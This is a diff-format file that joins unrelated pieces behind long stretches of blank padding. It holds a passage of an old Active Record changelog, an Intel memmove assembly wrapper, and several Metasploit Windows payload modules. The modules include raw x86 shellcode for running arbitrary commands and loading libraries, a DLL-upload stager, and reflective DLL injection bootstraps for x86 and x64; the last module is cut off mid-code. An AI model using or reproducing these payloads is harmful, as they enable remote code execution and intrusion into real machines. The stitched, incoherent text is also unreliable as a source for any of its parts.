@@ -1,0 +1,968 @@
+um": The "um" is replaced with an "a", so a Datum class becomes a data table.
+        * Class name ends in "child": The "child" is replaced with "children", so a NodeChild class becomes a node_children table.
+        * Class name ends in an "s": No additional characters are added or removed.
+        * Class name doesn't end in "s": An "s" is appended, so a Comment class becomes a comments table.
+        * Class name with word compositions: Compositions are underscored, so CreditCard class becomes a credit_cards table.
+        Additionally, the class-level table_name_prefix is prepended to the table_name and the table_name_suffix is appended.
+        So if you have "myapp_" as a prefix, the table name guess for an Account class becomes "myapp_accounts".
+
+        You can also overwrite this class method to allow for unguessable links, such as a Mouse class with a link to a
+        "mice" table. Example:
+
+          class Mouse < ActiveRecord::Base
+             def self.table_name() "mice" end
+          end
+
+    This conversion is now done through an external class called Inflector residing in lib/active_record/support/inflector.rb.
+
+*   Added find_all_in_collection to has_many defined collections. Works like this:
+
+        class Firm < ActiveRecord::Base
+          has_many :clients
+        end
+
+        firm.id # => 1
+        firm.find_all_in_clients "revenue > 1000" # SELECT * FROM clients WHERE firm_id = 1 AND revenue > 1000
+
+    *Requested by Dave Thomas*
+
+*   Fixed finders for inheritance hierarchies deeper than one level *Florian Weber*
+
+*   Added add_on_boundry_breaking to errors to accompany add_on_empty as a default validation method. It's used like this:
+
+        class Person < ActiveRecord::Base
+          protected
+            def validation
+              errors.add_on_boundry_breaking "password", 3..20
+            end
+        end
+
+    This will add an error to the tune of "is too short (minimum is 3 characters)" or "is too long (minimum is 20 characters)" if
+    the password is outside the boundry. The messages can be changed by passing a third and forth parameter as message strings.
+
+*   Implemented a clone method that works properly with AR. It returns a clone of the record that
+    hasn't been assigned an id yet and is treated as a new record.
+
+*   Allow for domain sockets in PostgreSQL by not assuming localhost when no host is specified *Scott Barron*
+
+*   Fixed that bignums are saved properly instead of attempted to be YAMLized *Andreas Schwartz*
+
+*   Fixed a bug in the GEM where the rdoc options weren't being passed according to spec *Chad Fowler*
+
+*   Fixed a bug with the exclusively_dependent option for has_many
+
+
+## 0.9.4 ##
+
+*   Correctly guesses the primary key when the class is inside a module [Dave Steinberg].
+
+*   Added [] and []= as alternatives to read_attribute and write_attribute *Dave Steinberg*
+
+*   has_and_belongs_to_many now accepts an :order key to determine in which order the collection is returned [radsaq].
+
+*   The ids passed to find and find_on_conditions are now automatically sanitized.
+
+*   Added escaping of plings in YAML content.
+
+*   Multi-parameter assigns where all the parameters are empty will now be set to nil instead of a new instance of their class.
+
+*   Proper type within an inheritance hierarchy is now ensured already at object initialization (instead of first at create)
+
+
+## 0.9.3 ##
+
+*   Fixed bug with using a different primary key name together with has_and_belongs_to_many *Investigation by Scott*
+
+*   Added :exclusively_dependent option to the has_many association macro. The doc reads:
+
+        If set to true all the associated object are deleted in one SQL statement without having their
+        before_destroy callback run. This should only be used on associations that depend solely on
+        this class and don't need to do any clean-up in before_destroy. The upside is that it's much
+        faster, especially if there's a counter_cache involved.
+
+*   Added :port key to connection options, so the PostgreSQL and MySQL adapters can connect to a database server
+    running on another port than the default.
+
+*   Converted the new natural singleton methods that prevented AR objects from being saved by PStore
+    (and hence be placed in a Rails session) to a module. *Florian Weber*
+
+*   Fixed the use of floats (was broken since 0.9.0+)
+
+*   Fixed PostgreSQL adapter so default values are displayed properly when used in conjunction with
+    Action Pack scaffolding.
+
+*   Fixed booleans support for PostgreSQL (use real true/false on boolean fields instead of 0/1 on tinyints) *radsaq*
+
+
+## 0.9.2 ##
+
+*   Added static method for instantly updating a record
+
+*   Treat decimal and numeric as Ruby floats *Andreas Schwartz*
+
+*   Treat chars as Ruby strings (fixes problem for Action Pack form helpers too)
+
+*   Removed debugging output accidently left in (which would screw web applications)
+
+
+## 0.9.1 ##
+
+*   Added MIT license
+
+*   Added natural object-style assignment for has_and_belongs_to_many associations. Consider the following model:
+
+        class Event < ActiveRecord::Base
+          has_one_and_belongs_to_many :sponsors
+        end
+
+        class Sponsor < ActiveRecord::Base
+          has_one_and_belongs_to_many :sponsors
+        end
+
+    Earlier, you'd have to use synthetic methods for creating associations between two objects of the above class:
+
+        roskilde_festival.add_to_sponsors(carlsberg)
+        roskilde_festival.remove_from_sponsors(carlsberg)
+
+        nike.add_to_events(world_cup)
+        nike.remove_from_events(world_cup)
+
+    Now you can use regular array-styled methods:
+
+        roskilde_festival.sponsors << carlsberg
+        roskilde_festival.sponsors.delete(carlsberg)
+
+        nike.events << world_cup
+        nike.events.delete(world_cup)
+
+*   Added delete method for has_many associations. Using this will nullify an association between the has_many and the belonging
+    object by setting the foreign key to null. Consider this model:
+
+        class Post < ActiveRecord::Base
+          has_many :comments
+        end
+
+        class Comment < ActiveRecord::Base
+          belongs_to :post
+        end
+
+    You could do something like:
+
+        funny_comment.has_post? # => true
+        announcement.comments.delete(funny_comment)
+        funny_comment.has_post? # => false
+
+
+## 0.9.0 ##
+
+*   Active Record is now thread safe! (So you can use it with Cerise and WEBrick applications)
+    *Implementation idea by Michael Neumann, debugging assistance by Jamis Buck*
+
+*   Improved performance by roughly 400% on a basic test case of pulling 100 records and querying one attribute.
+    This brings the tax for using Active Record instead of "riding on the metal" (using MySQL-ruby C-driver directly) down to ~50%.
+    Done by doing lazy type conversions and caching column information on the class-level.
+
+*   Added callback objects and procs as options for implementing the target for callback macros.
+
+*   Added "counter_cache" option to belongs_to that automates the usage of increment_counter and decrement_counter. Consider:
+
+        class Post < ActiveRecord::Base
+          has_many :comments
+        end
+
+        class Comment < ActiveRecord::Base
+          belongs_to :post
+        end
+
+    Iterating over 100 posts like this:
+
+        <% for post in @posts %>
+          <%= post.title %> has <%= post.comments_count %> comments
+        <% end %>
+
+    Will generate 100 SQL count queries -- one for each call to post.comments_count. If you instead add a "comments_count" int column
+    to the posts table and rewrite the comments association macro with:
+
+        class Comment < ActiveRecord::Base
+          belongs_to :post, :counter_cache => true
+        end
+
+    Those 100 SQL count queries will be reduced to zero. Beware that counter caching is only appropriate for objects that begin life
+    with the object it's specified to belong with and is destroyed like that as well. Typically objects where you would also specify
+    :dependent => true. If your objects switch from one belonging to another (like a post that can be move from one category to another),
+    you'll have to manage the counter yourself.
+
+*   Added natural object-style assignment for has_one and belongs_to associations. Consider the following model:
+
+        class Project < ActiveRecord::Base
+          has_one :manager
+        end
+
+        class Manager < ActiveRecord::Base
+          belongs_to :project
+        end
+
+    Earlier, assignments would work like following regardless of which way the assignment told the best story:
+
+        active_record.manager_id = david.id
+
+    Now you can do it either from the belonging side:
+
+        david.project = active_record
+
+    ...or from the having side:
+
+        active_record.manager = david
+
+    If the assignment happens from the having side, the assigned object is automatically saved. So in the example above, the
+    project_id attribute on david would be set to the id of active_record, then david would be saved.
+
+*   Added natural object-style assignment for has_many associations [Florian Weber]. Consider the following model:
+
+        class Project < ActiveRecord::Base
+          has_many :milestones
+        end
+
+        class Milestone < ActiveRecord::Base
+          belongs_to :project
+        end
+
+    Earlier, assignments would work like following regardless of which way the assignment told the best story:
+
+        deadline.project_id = active_record.id
+
+    Now you can do it either from the belonging side:
+
+        deadline.project = active_record
+
+    ...or from the having side:
+
+        active_record.milestones << deadline
+
+    The milestone is automatically saved with the new foreign key.
+
+*   API CHANGE: Attributes for text (or blob or similar) columns will now have unknown classes stored using YAML instead of using
+    to_s. (Known classes that won't be yamelized are: String, NilClass, TrueClass, FalseClass, Fixnum, Date, and Time).
+    Likewise, data pulled out of text-based attributes will be attempted converged using Yaml if they have the "--- " header.
+    This was primarily done to be enable the storage of hashes and arrays without wrapping them in aggregations, so now you can do:
+
+        user = User.find(1)
+        user.preferences = { "background" => "black", "display" => large }
+        user.save
+
+        User.find(1).preferences # => { "background" => "black", "display" => large }
+
+    Please note that this method should only be used when you don't care about representing the object in proper columns in
+    the database. A money object consisting of an amount and a currency is still a much better fit for a value object done through
+    aggregations than this new option.
+
+*   POSSIBLE CODE BREAKAGE: As a consequence of the lazy type conversions, it's a bad idea to reference the @attributes hash
+    directly (it always was, but now it's paramount that you don't). If you do, you won't get the type conversion. So to implement
+    new accessors for existing attributes, use read_attribute(attr_name) and write_attribute(attr_name, value) instead. Like this:
+
+        class Song < ActiveRecord::Base
+          # Uses an integer of seconds to hold the length of the song
+
+          def length=(minutes)
+            write_attribute("length", minutes * 60)
+          end
+
+          def length
+            read_attribute("length") / 60
+          end
+        end
+
+    The clever kid will notice that this opens a door to sidestep the automated type conversion by using @attributes directly.
+    This is not recommended as read/write_attribute may be granted additional responsibilities in the future, but if you think
+    you know what you're doing and aren't afraid of future consequences, this is an option.
+
+*   Applied a few minor bug fixes reported by Daniel Von Fange.
+
+
+## 0.8.4 ##
+
+    _Reflection_
+*   Added ActiveRecord::Reflection with a bunch of methods and classes for reflecting in aggregations and associations.
+
+*   Added Base.columns and Base.content_columns which returns arrays of column description (type, default, etc) objects.
+
+*   Added Base#attribute_names which returns an array of names for the attributes available on the object.
+
+*   Added Base#column_for_attribute(name) which returns the column description object for the named attribute.
+
+
+    _Misc_
+*   Added multi-parameter assignment:
+
+        # Instantiate objects for all attribute classes that needs more than one constructor parameter. This is done
+        # by calling new on the column type or aggregation type (through composed_of) object with these parameters.
+        # So having the pairs written_on(1) = "2004", written_on(2) = "6", written_on(3) = "24", will instantiate
+        # written_on (a date type) with Date.new("2004", "6", "24"). You can also specify a typecast character in the
+        # parenteses to have the parameters typecasted before they're used in the constructor. Use i for Fixnum, f for Float,
+        # s for String, and a for Array.
+
+    This is incredibly useful for assigning dates from HTML drop-downs of month, year, and day.
+
+*   Fixed bug with custom primary key column name and Base.find on multiple parameters.
+
+*   Fixed bug with dependent option on has_one associations if there was no associated object.
+
+
+## 0.8.3 ##
+
+    _Transactions_
+*   Added transactional protection for destroy (important for the new :dependent option) *Suggested by Carl Youngblood*
+
+*   Fixed so transactions are ignored on MyISAM tables for MySQL (use InnoDB to get transactions)
+
+*   Changed transactions so only exceptions will cause a rollback, not returned false.
+
+
+    _Mapping_
+*   Added support for non-integer primary keys *Aredridel/earlier work by Michael Neumann*
+
+        User.find "jdoe"
+        Product.find "PDKEY-INT-12"
+
+*   Added option to specify naming method for primary key column. ActiveRecord::Base.primary_key_prefix_type can either
+    be set to nil, :table_name, or :table_name_with_underscore. :table_name will assume that Product class has a primary key
+    of "productid" and :table_name_with_underscore will assume "product_id". The default nil will just give "id".
+
+*   Added an overwriteable primary_key method that'll instruct AR to the name of the
+    id column *Aredridele/earlier work by Guan Yang*
+
+        class Project < ActiveRecord::Base
+          def self.primary_key() "project_id" end
+        end
+
+*   Fixed that Active Records can safely associate inside and out of modules.
+
+        class MyApplication::Account < ActiveRecord::Base
+          has_many :clients # will look for MyApplication::Client
+          has_many :interests, :class_name => "Business::Interest" # will look for Business::Interest
+        end
+
+*   Fixed that Active Records can safely live inside modules *Aredridel*
+
+        class MyApplication::Account < ActiveRecord::Base
+        end
+
+
+    _Misc_
+*   Added freeze call to value object assignments to ensure they remain immutable *Spotted by Gavin Sinclair*
+
+*   Changed interface for specifying observed class in observers. Was OBSERVED_CLASS constant, now is
+    observed_class() class method. This is more consistant with things like self.table_name(). Works like this:
+
+        class AuditObserver < ActiveRecord::Observer
+          def self.observed_class() Account end
+          def after_update(account)
+            AuditTrail.new(account, "UPDATED")
+          end
+        end
+
+    *Suggested by Gavin Sinclair*
+
+*   Create new Active Record objects by setting the attributes through a block. Like this:
+
+        person = Person.new do |p|
+          p.name = 'Freddy'
+          p.age  = 19
+        end
+
+    *Suggested by Gavin Sinclair*
+
+
+## 0.8.2 ##
+
+*   Added inheritable callback queues that can ensure that certain callback methods or inline fragments are
+    run throughout the entire inheritance hierarchy. Regardless of whether a descendant overwrites the callback
+    method:
+
+        class Topic < ActiveRecord::Base
+          before_destroy :destroy_author, 'puts "I'm an inline fragment"'
+        end
+
+    Learn more in link:classes/ActiveRecord/Callbacks.html
+
+*   Added :dependent option to has_many and has_one, which will automatically destroy associated objects when
+    the holder is destroyed:
+
+        class Album < ActiveRecord::Base
+          has_many :tracks, :dependent => true
+        end
+
+    All the associated tracks are destroyed when the album is.
+
+*   Added Base.create as a factory that'll create, save, and return a new object in one step.
+
+*   Automatically convert strings in config hashes to symbols for the _connection methods. This allows you
+    to pass the argument hashes directly from yaml. (Luke)
+
+*   Fixed the install.rb to include simple.rb *Spotted by Kevin Bullock*
+
+*   Modified block syntax to better follow our code standards outlined in
+    http://www.rubyonrails.org/CodingStandards
+
+
+## 0.8.1 ##
+
+*   Added object-level transactions *Austin Ziegler*
+
+*   Changed adapter-specific connection methods to use centralized ActiveRecord::Base.establish_connection,
+    which is parametized through a config hash with symbol keys instead of a regular parameter list.
+    This will allow for database connections to be opened in a more generic fashion. (Luke)
+
+    NOTE: This requires all *_connections to be updated! Read more in:
+    http://ar.rubyonrails.org/classes/ActiveRecord/Base.html#M000081
+
+*   Fixed SQLite adapter so objects fetched from has_and_belongs_to_many have proper attributes
+    (t.name is now name). *Spotted by Garrett Rooney*
+
+*   Fixed SQLite adapter so dates are returned as Date objects, not Time objects *Spotted by Gavin Sinclair*
+
+*   Fixed requirement of date class, so date conversions are succesful regardless of whether you
+    manually require date or not.
+
+
+## 0.8.0 ##
+
+*   Added transactions
+
+*   Changed Base.find to also accept either a list (1, 5, 6) or an array of ids ([5, 7])
+    as parameter and then return an array of objects instead of just an object
+
+*   Fixed method has_collection? for has_and_belongs_to_many macro to behave as a
+    collection, not an association
+
+*   Fixed SQLite adapter so empty or nil values in columns of datetime, date, or time type
+    aren't treated as current time *Spotted by Gavin Sinclair*
+
+
+## 0.7.6 ##
+
+*   Fixed the install.rb to create the lib/active_record/support directory *Spotted by Gavin Sinclair*
+*   Fixed that has_association? would always return true *Daniel Von Fange*
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /*
+Copyright (c) 2010, Intel Corporation
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+
+    * Redistributions of source code must retain the above copyright notice,
+    * this list of conditions and the following disclaimer.
+
+    * Redistributions in binary form must reproduce the above copyright notice,
+    * this list of conditions and the following disclaimer in the documentation
+    * and/or other materials provided with the distribution.
+
+    * Neither the name of Intel Corporation nor the names of its contributors
+    * may be used to endorse or promote products derived from this software
+    * without specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
+ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
+ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
+ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+*/
+
+#if defined(USE_SSSE3)
+
+# include "cache_wrapper.S"
+# undef __i686
+# define MEMCPY memmove
+# define USE_AS_MEMMOVE
+# include "ssse3-memcpy5.S"
+
+#else
+
+# include "memmove.S"
+
+#endif
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 e, "The symbolic name of the library to upload", "msf.dll" ])
+			], DllInject)
+	end
+
+	#
+	# Returns the library name
+	#
+	def library_name
+		datastore['LibraryName'] || 'msf.dll'
+	end
+
+	#
+	# Returns the library path
+	#
+	def library_path
+		datastore['DLL']
+	end
+
+	#
+	# Transmits the DLL injection payload and its associated DLL to the remote
+	# computer so that it can be loaded into memory.
+	#
+	def handle_connection_stage(conn, opts = {})
+		data = library_name + "\x00"
+
+		begin
+			File.open(library_path, "rb") { |f|
+				data += f.read
+			}
+		rescue
+			print_error("Failed to load DLL: #{$!}.")
+
+			# TODO: exception
+			conn.close
+			return
+		end
+
+		print_status("Uploading DLL (#{data.length} bytes)...")
+
+		# Send the size of the thing we're transferring
+		conn.put([ data.length ].pack('V'))
+		# Send the image name + image
+		conn.put(data)
+
+		print_status("Upload completed.")
+
+		# Call the parent so the session gets created.
+		super
+	end
+
+end
+
+end
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     # -*- coding: binary -*-
+##
+# $Id: exec.rb 15548 2012-06-29 06:08:20Z rapid7 $
+##
+
+module Msf
+
+###
+#
+# Common command execution implementation for Windows.
+#
+###
+
+module Payload::Windows::Exec
+
+	include Msf::Payload::Windows
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          => 'Windows Execute Command',
+			'Version'       => '$Revision: 15548 $',
+			'Description'   => 'Execute an arbitrary command',
+			'Author'        => [ 'vlad902', 'sf' ],
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'win',
+			'Arch'          => ARCH_X86,
+			'PayloadCompat' =>
+				{
+					'Convention' => '-passivex -http -https',
+				},
+			'Payload'       =>
+				{
+					'Offsets' =>
+						{
+							'EXITFUNC' => [ 161, 'V' ]
+						},
+					'Payload' =>
+						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
+						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
+						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
+						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
+						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
+						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
+						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
+						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
+						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
+						"\x6A\x01\x8D\x85\xB9\x00\x00\x00\x50\x68\x31\x8B\x6F\x87\xFF\xD5" +
+						"\xBB\xE0\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A" +
+						"\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"
+				}
+			))
+
+		# Register command execution options
+		register_options(
+			[
+				OptString.new('CMD', [ true, "The command string to execute" ]),
+			], Msf::Payload::Windows::Exec)
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + command_string + "\x00"
+	end
+
+	#
+	# Returns the command string to use for execution
+	#
+	def command_string
+		return datastore['CMD'] || ''
+	end
+
+end
+
+end
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     # -*- coding: binary -*-
+##
+# $Id: loadlibrary.rb 15548 2012-06-29 06:08:20Z rapid7 $
+##
+
+module Msf
+
+###
+#
+# Common loadlibrary implementation for Windows.
+#
+###
+
+module Payload::Windows::LoadLibrary
+
+	include Msf::Payload::Windows
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          => 'Windows LoadLibrary Path',
+			'Version'       => '$Revision: 15548 $',
+			'Description'   => 'Load an arbitrary library path',
+			'Author'        => [ 'sf', 'hdm' ],
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'win',
+			'Arch'          => ARCH_X86,
+			'PayloadCompat' =>
+				{
+					'Convention' => '-http -https',
+				},
+			'Payload'       =>
+				{
+					'Offsets' =>
+						{
+							'EXITFUNC' => [ 159, 'V' ]
+						},
+					'Payload' =>
+						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
+						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
+						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
+						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
+						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
+						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
+						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
+						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
+						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
+						"\x8D\x85\xB7\x00\x00\x00\x50\x68\x4C\x77\x26\x07\xFF\xD5\xBB\xE0" +
+						"\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB" +
+						"\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"
+				}
+			))
+
+		# Register command execution options
+		register_options(
+			[
+				OptString.new('DLL', [ true, "The library path to load (UNC is OK)" ]),
+			], self.class)
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + dll_string + "\x00"
+	end
+
+	#
+	# Returns the command string to use for execution
+	#
+	def dll_string
+		return datastore['DLL'] || ''
+	end
+
+end
+
+end
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  # -*- coding: binary -*-
+
+require 'msf/core'
+require 'rex/peparsey'
+
+module Msf
+
+
+###
+#
+# Common module stub for ARCH_X86 payloads that make use of Reflective DLL Injection.
+#
+###
+
+
+module Payload::Windows::ReflectiveDllInject
+
+	include Msf::Payload::Windows
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          => 'Reflective DLL Injection',
+			'Version'       => '$Revision: 15548 $',
+			'Description'   => 'Inject a DLL via a reflective loader',
+			'Author'        => [ 'sf' ],
+			'References'    => [ [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ] ],
+			'Platform'      => 'win',
+			'Arch'          => ARCH_X86,
+			'PayloadCompat' =>
+				{
+					'Convention' => 'sockedi -https',
+				},
+			'Stage'         =>
+				{
+					'Offsets' =>
+						{
+							'EXITFUNC' => [ 33, 'V' ]
+						},
+					'Payload' => ""
+				}
+			))
+
+		register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
+	end
+
+	def library_path
+		datastore['DLL']
+	end
+
+	def stage_payload(target_id=nil)
+		dll    = ""
+		offset = 0
+
+		begin
+			File.open( library_path, "rb" ) { |f| dll += f.read(f.stat.size) }
+
+			pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
+
+			pe.exports.entries.each do |entry|
+				if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
+					offset = pe.rva_to_file_offset( entry.rva )
+					break
+				end
+			end
+
+			raise "Can't find an exported ReflectiveLoader function!" if offset == 0
+		rescue
+			print_error( "Failed to read and parse Dll file: #{$!}" )
+			return
+		end
+
+		exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
+
+		bootstrap = "\x4D" +                            # dec ebp             ; M
+					"\x5A" +                            # pop edx             ; Z
+					"\xE8\x00\x00\x00\x00" +            # call 0              ; call next instruction
+					"\x5B" +                            # pop ebx             ; get our location (+7)
+					"\x52" +                            # push edx            ; push edx back
+					"\x45" +                            # inc ebp             ; restore ebp
+					"\x55" +                            # push ebp            ; save ebp
+					"\x89\xE5" +                        # mov ebp, esp        ; setup fresh stack frame
+					"\x81\xC3" + [offset-7].pack( "V" ) + # add ebx, 0x???????? ; add offset to ReflectiveLoader
+					"\xFF\xD3" +                        # call ebx            ; call ReflectiveLoader
+					"\x89\xC3" +                        # mov ebx, eax        ; save DllMain for second call
+					"\x57" +                            # push edi            ; our socket
+					"\x68\x04\x00\x00\x00" +            # push 0x4            ; signal we have attached
+					"\x50" +                            # push eax            ; some value for hinstance
+					"\xFF\xD0" +                        # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
+					"\x68" + exit_funk +                # push 0x????????     ; our EXITFUNC placeholder
+					"\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
+					"\x50" +                            # push eax            ; some value for hinstance
+					"\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
+
+		# sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
+		if( bootstrap.length > 62 )
+			print_error( "Reflective Dll Injection (x86) generated an oversized bootstrap!" )
+			return
+		end
+
+		# patch the bootstrap code into the dll's DOS header...
+		dll[ 0, bootstrap.length ] = bootstrap
+
+		# patch the target ID into the URI if specified
+		if target_id
+			i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
+			if i
+				t = target_id.to_s
+				raise "Target ID must be less than 5 bytes" if t.length > 4
+				u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
+				print_status("Patching Target ID #{t} into DLL")
+				dll[i, u.length] = u
+			end
+		end
+
+		# return our stage to be loaded by the intermediate stager
+		return dll
+	end
+
+end
+
+end
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         # -*- coding: binary -*-
+
+require 'msf/core'
+require 'rex/peparsey'
+
+module Msf
+
+
+###
+#
+# Common module stub for ARCH_X86_64 payloads that make use of Reflective DLL Injection.
+#
+###
+
+
+module Payload::Windows::ReflectiveDllInject_x64
+
+	include Msf::Payload::Windows
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          => 'Reflective DLL Injection',
+			'Version'       => '$Revision: 15548 $',
+			'Description'   => 'Inject a DLL via a reflective loader',
+			'Author'        => [ 'sf' ],
+			'References'    => [ [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ] ],
+			'Platform'      => 'win',
+			'Arch'          => ARCH_X86_64,
+			'PayloadCompat' =>
+				{
+					'Convention' => 'sockrdi'
+				},
+			'Stage'         =>
+				{
+					'Offsets' =>
+						{
+							'EXITFUNC' => [ 47, 'V' ]
+						},
+					'Payload' => ""
+				}
+			))
+
+		register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
+	end
+
+	def library_path
+		datastore['DLL']
+	end
+
+	def stage_payload
+		dll    = ""
+		offset = 0
+
+		begin
+			::File.open( library_path, "rb" ) { |f| dll += f.read(f.stat.size) }
+
+			pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
+
+			pe.exports.entries.each do |entry|
+				if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
+					offset = pe.rva_to_file_offset( entry.rva )
+					break
+				end
+			end
+
+			raise "Can't find an exported ReflectiveLoader function!" if offset == 0
+		rescue
+			print_error( "Failed to read and parse Dll file: #{$!}" )
+			return
+		end
+
+		exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
+
+		bootstrap = "\x4D\x5A" +                        # pop r10             ; pop r10 = 'MZ'
+					"\x41\x52" +                        # push r10            ; push r10 back
+					"\x55" +                            # push rbp            ; save ebp
+					"\x48\x89\xE5" +                    # mov rbp, rsp        ; setup fresh stack frame
+					"\x48\x81\xEC\x20\x00\x00\x00" +    # sub rsp, 32         ; alloc some space for calls
+					"\x48\x8D\x1D\xEA\xFF\xFF\xFF" +    # lea rbx, [rel+0]    ; get virtual address for the start of this stub
+					"\x48\x81\xC3" + [offset].pack( "V" ) + # add rbx, 0x???????? ; add offset to ReflectiveLoader
